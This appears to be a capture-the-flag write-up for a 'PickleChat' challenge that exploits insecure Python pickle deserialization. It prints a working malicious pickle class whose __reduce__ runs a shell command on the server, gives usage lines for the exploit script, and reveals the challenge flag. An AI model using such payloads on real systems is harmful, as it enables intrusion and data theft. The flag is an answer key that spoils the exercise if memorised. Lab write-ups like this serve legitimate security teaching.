# PickleChat

- There is a pickle deserialization vulnerability present in the application.
- The user can inject a custom class object and have it execute code when processed by the server.
- First the user must send a malicious message to the server and have the malicious pickle processed.
- After the message has been sent, the user will request to decrypt the message that was just uploaded.
- This will reveal the output of the pickle exploit.
- I have modified the client application to always send the malicious pickle, regardless of what the user passes in.
- The [exploit script](malicious_client.py) automates the process of exploiting the server and getting the flag.


## Process

```bash
# the below line will be the format during the first run
python3 malicious_client.py challenge.ctf.games <port>

# the below line will be the format for every subsequent
# execution of the exploit on the target, because the user
# will have already been registered with the server.
python3 malicious_client.py challenge.ctf.games <port> --skip-reg

```

## Code Snippets

Malicious Object:

```python3
class BadPickle:
    def __reduce__(self):
        ############################################################
        # These three lines take advantage of the ability to
        # dynamically import modules in Python. This allows the
        # attacker to import target modules required for their
        # exploit to work correctly. In this example the modules
        # PLATFORM and OS will be used in the exploit.
        ############################################################
        import platform
        import os
        import subprocess

        ############################################################
        # The if-else block below handles the OS type the insecure
        # deserialization will take place on. 
        #
        # This will capture the output of the "cat flag.txt"
        # command when processed.
        ############################################################
        if platform.system().lower() == "linux":
            cmd = (("cat", "flag.txt",),)
        else:
            cmd = (("type", "flag.txt"),)

        return (subprocess.check_output, cmd)
```

# Flag

1. Flag: `flag{b2d366b8dbd31517c2de39e45fd5db28}`

# References

1. [Subprocess Capture Output](https://stackoverflow.com/questions/34431673/how-to-get-the-output-from-os-system)
1. [Pickle Attack Example 1](https://blog.nelhage.com/2011/03/exploiting-pickle/)
1. [Pickle Attack Example 2](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

